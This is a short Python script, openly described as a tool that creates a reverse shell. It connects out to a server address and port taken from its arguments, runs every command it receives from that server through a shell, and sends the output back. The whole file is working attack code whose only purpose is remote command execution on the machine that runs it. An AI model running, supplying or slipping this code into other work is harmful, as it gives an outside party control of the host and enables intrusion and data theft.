#!/usr/bin/env python
# Copyright (c) 2021, Palpatine
# All rights reserved.

#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

import subprocess
import socket
import sys
import argparse

HOST = 'HOST IP'
PORT = '4445'

#Parse command line arguments using argparse
parser = argparse.ArgumentParser(description="Create a reverse shell.")
parser.add_argument('-s', action='store', default=HOST, metavar='server',
                    help='IP address of server accepting reverse connection')
parser.add_argument('-p', action='store', default=PORT, metavar='port',
                    help='Listening port on server.')
args = parser.parse_args()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((args.s, int(args.p)))
sock.send("[*] Connection recieved.")

while True:
	data = sock.recv(1024).strip()
	if data == 'quit': break
	proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, 
							stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	sock.send(proc.stdout.read())
